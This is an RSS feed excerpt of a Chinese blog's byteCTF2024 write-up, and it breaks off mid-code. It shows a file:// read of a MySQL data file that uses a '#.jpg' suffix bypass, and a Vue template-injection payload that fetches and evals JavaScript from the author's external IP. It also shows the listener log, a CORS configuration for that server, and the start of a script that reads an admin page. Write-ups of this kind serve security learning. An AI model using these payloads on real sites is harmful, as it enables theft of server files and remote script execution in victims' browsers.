<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Vue on baozongwi's blog</title><link>https://baozongwi.xyz/tags/vue/</link><description>Recent content in Vue on baozongwi's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>baozongwi</copyright><lastBuildDate>Sun, 22 Sep 2024 21:15:25 +0000</lastBuildDate><atom:link href="https://baozongwi.xyz/tags/vue/index.xml" rel="self" type="application/rss+xml"/><item><title>byteCTF2024</title><link>https://baozongwi.xyz/p/bytectf2024/</link><pubDate>Sun, 22 Sep 2024 21:15:25 +0000</pubDate><guid>https://baozongwi.xyz/p/bytectf2024/</guid><description>&lt;h1 id="0x01-前言">0x01 前言
&lt;/h1>&lt;p>感谢师傅发来的一份WP让我有动手操练的机会&lt;/p>
&lt;h1 id="0x02-question">0x02 question
&lt;/h1>&lt;h2 id="onlybypassme">OnlyBypassMe
&lt;/h2>&lt;p>进入之后找到修改头像的部分，利用&lt;code>file&lt;/code>协议读取&lt;/p>
&lt;p>&lt;strong>mysql常用文件后缀&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>.ibd&lt;/strong>：InnoDB 表的独立表空间文件。&lt;/li>
&lt;li>&lt;strong>.frm&lt;/strong>：表的定义文件。&lt;/li>
&lt;li>&lt;strong>.MYD&lt;/strong> 和 &lt;strong>.MYI&lt;/strong>：MyISAM 表的数据和索引文件。&lt;/li>
&lt;li>&lt;strong>ibdata1&lt;/strong>：系统表空间文件。&lt;/li>
&lt;li>&lt;strong>.opt&lt;/strong>：数据库的选项和配置信息。&lt;/li>
&lt;li>&lt;strong>.trn&lt;/strong> 和 &lt;strong>.trg&lt;/strong>：触发器的相关信息。&lt;/li>
&lt;li>&lt;strong>.isl&lt;/strong>：InnoDB 表的导入和导出文件。&lt;/li>
&lt;li>&lt;strong>.sql&lt;/strong>：SQL 脚本文件。&lt;/li>
&lt;li>&lt;strong>.err&lt;/strong>：错误日志文件。&lt;/li>
&lt;li>&lt;strong>.pid&lt;/strong>：MySQL 服务器进程的 PID 文件。&lt;/li>
&lt;li>&lt;strong>.cnf&lt;/strong>：MySQL 服务器的配置文件。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>MySQL常用目录&lt;/strong>(借用别的师傅总结的)&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Variable_name&lt;/th>
&lt;th>Value&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>basedir&lt;/td>
&lt;td>/usr&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>binlog_direct_non_transactional_updates&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>character_sets_dir&lt;/td>
&lt;td>/usr/share/mysql/charsets/&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>datadir&lt;/td>
&lt;td>/var/lib/mysql/&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ignore_db_dirs&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>innodb_data_home_dir&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>innodb_log_group_home_dir&lt;/td>
&lt;td>./&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>innodb_max_dirty_pages_pct&lt;/td>
&lt;td>75&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>innodb_max_dirty_pages_pct_lwm&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>innodb_undo_directory&lt;/td>
&lt;td>.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>lc_messages_dir&lt;/td>
&lt;td>/usr/share/mysql/&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>plugin_dir&lt;/td>
&lt;td>/usr/lib/mysql/plugin/&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>slave_load_tmpdir&lt;/td>
&lt;td>/tmp&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>tmpdir&lt;/td>
&lt;td>/tmp&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">api&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">v1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">updateAvatarV1&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="n">bb30c3c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">clsadp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Pragma&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">no&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="ne">Control&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">no&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Insecure&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Requests&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Agent&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Mozilla&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">5.0&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Windows&lt;/span> &lt;span class="n">NT&lt;/span> &lt;span class="mf">10.0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">Win64&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">x64&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">AppleWebKit&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">537.36&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">KHTML&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">like&lt;/span> &lt;span class="n">Gecko&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">Chrome&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">129.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.0&lt;/span> &lt;span class="n">Safari&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">xhtml&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">xml&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">xml&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">image&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">avif&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">image&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">webp&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">image&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">apng&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">*/*&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">signed&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">exchange&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">b3&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.7&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Encoding&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">gzip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Language&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">zh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">CN&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">zh&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.9&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">en&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cookie&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">JSESSIONID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">1072184E7&lt;/span>&lt;span class="n">D30CC96E0FC1CE1035C26F4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">close&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">application&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">json&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">Length&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">58&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;url&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;file:///var/lib/mysql/byteCTF/flag.ibd#.jpg&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>利用&lt;code>#&lt;/code>,伪造后缀&lt;code>jpg&lt;/code>读取&lt;code>flag&lt;/code>,其实这个在zip协议的时候早就有使用过,当时为了文件能够正常解析&lt;code>zip&lt;/code>文件中的恶意文件,使用这个&lt;code>%23&lt;/code>来代替&lt;code>#&lt;/code>,不然的话是无法正常解析的，来两个例子看看&lt;/p>
&lt;p>HTTP请求不包括&lt;code>#&lt;/code>，改变&lt;code>#&lt;/code>不触发网页重载，但会改变浏览器的访问历史
&lt;code>#&lt;/code>是用来指导浏览器动作的，对服务器端完全无用，所以HTTP请求中不包括&lt;code>#&lt;/code>。比如，访问下面的网址，&lt;code>http://www.example.com/index.html#print&lt;/code>，浏览器实际发出的请求是这样的：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> GET /index.html HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Host: www.example.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>#&lt;/code>后面的内容不会被发送到服务器端
在第一个&lt;code>#&lt;/code>后面出现的任何字符都会被浏览器解读为位置标识符，这些字符都不会被发送到服务器端。
比如，下面URL的原意是指定一个颜色值：&lt;code>http://www.example.com/?color=#fff&lt;/code>，但是浏览器实际发出的请求是：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> GET /?color= HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Host: www.example.com
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>但是这样子确确实实是可以达到某些目的的，比如这次的后缀限定成功绕过了&lt;/strong>&lt;/p>
&lt;h2 id="crossvue">CrossVue
&lt;/h2>&lt;p>vue的SSTI注入&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">profileRegex&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MatchString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">registerInfo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Profile&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StatusBadRequest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">gin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s">&amp;#34;error&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;Profile must not exceed 80 characters.&amp;#34;&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里说了不准超过80个字符，://emm&lt;/p>
&lt;p>而且不能够出现&lt;code>&amp;lt;&amp;gt;&lt;/code>这些被转义的字符&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/bytectf2024/QQ20240923-044529.png"
width="1740"
height="963"
srcset="https://baozongwi.xyz/p/bytectf2024/QQ20240923-044529_hu_e1df062f625cacc1.png 480w, https://baozongwi.xyz/p/bytectf2024/QQ20240923-044529_hu_c6cbeef3bb883235.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="180"
data-flex-basis="433px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/bytectf2024/QQ20240923-043922.png"
width="1765"
height="982"
srcset="https://baozongwi.xyz/p/bytectf2024/QQ20240923-043922_hu_e7515c4f690e9fb4.png 480w, https://baozongwi.xyz/p/bytectf2024/QQ20240923-043922_hu_ac890a07e437c344.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="179"
data-flex-basis="431px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{{fetch(&amp;#39;http://27.25.151.48:51008/&amp;#39;).then(t=&amp;gt;t.text()).then(eval)}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>成功打出回显&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@dkcjbRCL8kgaNGz:~# nc -lvnp &lt;span class="m">51008&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Listening on 0.0.0.0 &lt;span class="m">51008&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection received on 171.218.218.235 &lt;span class="m">52998&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GET / HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: ip:51008
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-Agent: Mozilla/5.0 &lt;span class="o">(&lt;/span>Windows NT 10.0&lt;span class="p">;&lt;/span> Win64&lt;span class="p">;&lt;/span> x64&lt;span class="o">)&lt;/span> AppleWebKit/537.36 &lt;span class="o">(&lt;/span>KHTML, like Gecko&lt;span class="o">)&lt;/span> Chrome/129.0.0.0 Safari/537.36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept: */*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Encoding: gzip, deflate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Language: zh-CN,zh&lt;span class="p">;&lt;/span>&lt;span class="nv">q&lt;/span>&lt;span class="o">=&lt;/span>0.9,en&lt;span class="p">;&lt;/span>&lt;span class="nv">q&lt;/span>&lt;span class="o">=&lt;/span>0.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Origin: http://e2111211.clsadp.com
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Referer: http://e2111211.clsadp.com/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但是查阅一下网上的发现当前后端分离时，是需要跨域请求的，那么我们配置一个&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">location / {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # 允许任意源
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add_header &amp;#39;Access-Control-Allow-Origin&amp;#39; &amp;#39;*&amp;#39;;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # 允许的请求方法
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add_header &amp;#39;Access-Control-Allow-Methods&amp;#39; &amp;#39;GET, POST, OPTIONS&amp;#39;;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # 允许的请求头
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add_header &amp;#39;Access-Control-Allow-Headers&amp;#39; &amp;#39;Origin, X-Requested-With, Content-Type, Accept, Authorization&amp;#39;;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # 预检请求（OPTIONS 方法）的处理
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> if ($request_method = &amp;#39;OPTIONS&amp;#39;) {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add_header &amp;#39;Access-Control-Max-Age&amp;#39; 1728000;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add_header &amp;#39;Content-Type&amp;#39; &amp;#39;text/plain charset=UTF-8&amp;#39;;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add_header &amp;#39;Content-Length&amp;#39; 0;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> return 204;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # First attempt to serve request as file, then
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # as directory, then fall back to displaying a 404.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> try_files $uri $uri/ =404;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>测试一下是否配置成功&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">root@dkcjbRCL8kgaNGz:/etc/nginx/sites-available# curl -H &amp;#34;Origin: http://baidu.com&amp;#34; -I http://27.25.151.48:12138/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HTTP/1.1 200 OK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Server: nginx/1.18.0 (Ubuntu)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Date: Sun, 22 Sep 2024 21:16:39 GMT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: text/html
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Length: 612
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last-Modified: Sat, 31 Aug 2024 08:40:12 GMT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: keep-alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ETag: &amp;#34;66d2d6ec-264&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Access-Control-Allow-Origin: *
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Access-Control-Allow-Methods: GET, POST, OPTIONS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Ranges: bytes
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后这样子肯定是不能完全获得&lt;code>flag&lt;/code>的，那么我们在&lt;code>vps&lt;/code>上面还要再写一个&lt;code>js&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/admin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">=&amp;gt;&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">text&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">=&amp;gt;&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">match&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sr">/&amp;lt;h1&amp;gt;(.*?)&amp;lt;\/h1&amp;gt;/&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
